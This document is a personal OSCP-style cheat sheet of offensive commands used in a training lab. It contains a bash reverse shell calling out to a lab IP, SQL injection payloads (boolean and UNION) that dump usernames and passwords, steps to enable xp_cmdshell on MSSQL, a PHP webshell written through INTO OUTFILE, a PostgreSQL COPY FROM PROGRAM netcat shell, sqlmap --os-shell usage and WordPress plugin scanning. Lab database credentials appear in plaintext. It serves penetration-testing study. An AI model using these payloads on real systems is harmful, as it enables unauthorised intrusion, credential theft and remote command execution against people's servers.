# OSCP Notes

## Vital Tools

* wpscan https://github.com/wpscanteam/wpscan

## Reverse Shell 
```$ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```

```$ nc -nvlp 4444```

## SQL Manual Executeion

### Connect and Nav

Login to MySQL using mysql: 

```$ mysql -u root -p'root' -h 192.168.50.16 -P 3306```

|MySQL Commands| 
|----| 
|  > select version();   |
|  > select system_user();   |
|  > show databases;   |

Login to MSSQL using impacket-mssqlclient: 

```$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```

|MSSQL Commands| 
|----| 
|  > SELECT @@version;   |
|  > SELECT name FROM sys.databases;   |
|  > SELECT * FROM offsec.information_schema.tables;   |
| > select * from offsec.dbo.users; |


### GENERAL Attack Payloads:

```' or 1=1 in (select @@version) -- //```

```' OR 1=1 in (SELECT * FROM users) -- //```

```' or 1=1 in (SELECT password FROM users) -- //```

```' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //```


### UNION Attack Payloads:


```%' UNION SELECT database(), user(), @@version, null, null -- //```

```' UNION SELECT null, null, database(), user(), @@version  -- //```

```' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //```

```' UNION SELECT null, username, password, description, null FROM users -- //```


### Execute Commands

MSSQL Commands: 

```$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```

```> EXECUTE sp_configure 'show advanced options', 1;```

```> RECONFIGURE;```

```> EXECUTE sp_configure 'xp_cmdshell',1;```

```> RECONFIGURE;```

```> EXECUTE xp_cmdshell 'whoami';```

### Write a Webshell Payloads:

```' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //```

### Command Execution with Stacked Queries:

```
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'nc -l -p -e /bin/sh';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```
### SQL Map 

Usage Commands:

* Note -p specifies a parameter we want to test
* Note --os-shell tries to get a shell on target

```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump```

OR intercept a Post request and use that to pass parameters

```sqlmap -r POST.req -p item  --os-shell  --web-root "/var/www/html/tmp"```


# WordPress

## Plugins

Remember, WP Plugins are exploitable. Verisons can be found in the source code

### Get WP Plugins

```wpscan --url {url_here}```

### WP Plugin CVEs

`https://github.com/Hacker5preme/Exploits/blob/main/README.md`
